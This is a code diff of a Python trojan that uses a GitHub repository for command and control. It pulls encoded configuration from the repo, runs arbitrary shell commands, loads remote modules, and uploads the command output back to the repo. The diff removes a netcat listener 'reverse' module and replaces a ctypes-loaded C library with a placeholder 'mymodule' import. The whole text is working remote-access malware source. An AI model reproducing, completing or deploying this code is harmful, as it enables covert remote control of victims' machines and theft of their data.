@@ -9,7 +9,9 @@ import time
 import subprocess
 import requests
 from datetime import datetime
-from ctypes import CDLL, c_int
+
+# Import the C module (replace 'mymodule' with the actual name of your compiled C module)
+import mymodule
 
 def github_connect():
     with open('secret.txt') as f:
@@ -34,6 +36,7 @@ class Trojan:
         try:
             config_json = get_file_contents('config', self.config_file, self.repo)
             decoded_config = base64.b64decode(config_json).decode('utf-8')
+            # print(f"Decoded config JSON: {decoded_config}")  # Debug output
             return json.loads(decoded_config)
         except Exception as e:
             print(f"Error fetching GitHub config: {e}")
@@ -74,55 +77,42 @@ class Trojan:
                 shell_command = command.get('command')
                 if shell_command:
                     try:
-                        print(f"[*] Executing command: {shell_command}")
+                        print(f"[*] Executing command: {shell_command}")  # Debug output
                         result = subprocess.check_output(shell_command, shell=True, stderr=subprocess.STDOUT)
                         result = result.decode('utf-8')
-                        self.store_command_result(shell_command, result)
                     except subprocess.CalledProcessError as e:
                         result = e.output.decode('utf-8')
                     self.send_command_result(shell_command, result)
+                    self.store_command_result(shell_command, result)
             elif command_type == 'module':
                 module_name = command.get('module')
-                if module_name == "reverse":
-                    result = subprocess.check_output('nc -lvnp 8000', shell=True, stderr=subprocess.STDOUT)
-                    result = result.decode('utf-8')
-                    self.store_command_result(module_name, result)
-                    self.send_command_result(module_name, result)
-                else:
+                if module_name:
                     if module_name not in sys.modules:
                         importlib.import_module(module_name)
                     thread = threading.Thread(target=self.module_runner, args=(module_name,))
                     thread.start()
             elif command_type == 'c_module':
-                c_module_name = command.get('c_module')
-                if c_module_name:
-                    self.execute_c_module(c_module_name)
+                # Example of executing a function from the C module
+                result = mymodule.some_function()  # Replace 'some_function' with the actual function in your C module
+                self.send_command_result('c_module', result)
+                self.store_command_result('c_module', result)
         else:
             print(f"Invalid command format: {command}")
-
-    def execute_c_module(self, c_module_name):
-        try:
-            c_lib = CDLL(f"./{c_module_name}.so")  # Load the shared library
-            c_lib.my_function()  # Call the C function
-            result = c_lib.add(c_int(2), c_int(3))  # Call the add function
-            self.send_command_result(c_module_name, f"Result from C module: {result}")
-        except Exception as e:
-            print(f"Failed to execute C module {c_module_name}: {e}")
 
     def module_runner(self, module):
         result = sys.modules[module].run()
         self.store_module_result(result)
 
-    def store_command_result(self, command, result):
-        message = datetime.now().isoformat()
-        remote_path = f'data/{self.id}/{message}.data'
-        bindata = base64.b64encode(bytes(f"Command: {command}\nResult:\n{result}", 'utf-8'))
-        self.repo.create_file(remote_path, message, bindata)
-
     def store_module_result(self, data):
         message = datetime.now().isoformat()
         remote_path = f'data/{self.id}/{message}.data'
         bindata = base64.b64encode(bytes('%r' % data, 'utf-8'))
+        self.repo.create_file(remote_path, message, bindata)
+
+    def store_command_result(self, command, result):
+        message = datetime.now().isoformat()
+        remote_path = f'data/{self.id}/{message}.data'
+        bindata = base64.b64encode(bytes(f'Command: {command}\nResult: {result}', 'utf-8'))
         self.repo.create_file(remote_path, message, bindata)
 
     def run(self):
